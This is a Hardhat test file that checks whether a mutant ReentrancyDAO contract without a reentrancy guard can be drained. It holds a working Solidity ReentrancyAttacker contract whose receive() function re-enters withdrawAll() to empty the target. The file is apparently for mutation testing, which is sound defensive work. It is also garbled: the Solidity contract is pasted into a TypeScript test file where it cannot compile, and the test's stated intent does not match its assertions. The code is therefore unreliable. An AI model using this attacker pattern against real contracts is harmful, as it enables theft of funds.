import { expect } from "chai";
import { ethers } from "hardhat";

describe("ReentrancyDAO mutant kill test - reentrancy attack", function () {
  it("should allow reentrancy attack on mutant (no reentrancy guard), but fail on original", async function () {
    // Deploy the target contract (no constructor arguments needed)
    const Factory = await ethers.getContractFactory("ReentrancyDAO");
    const target = await Factory.deploy();
    await target.waitForDeployment();

    // Deploy the attacker contract
    const AttackerFactory = await ethers.getContractFactory("ReentrancyAttacker");
    const attacker = await AttackerFactory.deploy(await target.getAddress());
    await attacker.waitForDeployment();

    // Fund the target contract with 2 ETH
    const [owner] = await ethers.getSigners();
    await owner.sendTransaction({
      to: await target.getAddress(),
      value: ethers.parseEther("2")
    });

    // Attacker deposits 1 ETH
    await attacker.deposit({ value: ethers.parseEther("1") });

    // Check initial balances
    const targetBalanceBefore = await ethers.provider.getBalance(await target.getAddress());
    const attackerBalanceBefore = await ethers.provider.getBalance(await attacker.getAddress());
    expect(targetBalanceBefore).to.equal(ethers.parseEther("2"));
    expect(attackerBalanceBefore).to.equal(ethers.parseEther("1"));

    // Attacker calls withdrawAll - if reentrancy guard is missing, it will drain the contract
    await attacker.attack();

    // Check that attacker drained more than its deposit (only possible without reentrancy guard)
    const targetBalanceAfter = await ethers.provider.getBalance(await target.getAddress());
    const attackerBalanceAfter = await ethers.provider.getBalance(await attacker.getAddress());

    // If the mutant is present (no reentrancy guard), the attacker should have >1 ETH
    // and the target should have 0 ETH (drained)
    expect(targetBalanceAfter).to.equal(0);
    expect(attackerBalanceAfter).to.be.gt(ethers.parseEther("1"));
  });
});

// Attacker contract for reentrancy test
contract ReentrancyAttacker {
    ReentrancyDAO public target;
    uint public attackCount;

    constructor(address _target) {
        target = ReentrancyDAO(_target);
    }

    function deposit() external payable {
        target.deposit{value: msg.value}();
    }

    function attack() external {
        target.withdrawAll();
    }

    receive() external payable {
        if (address(target).balance >= 1 ether && attackCount < 5) {
            attackCount++;
            target.withdrawAll();
        }
    }
}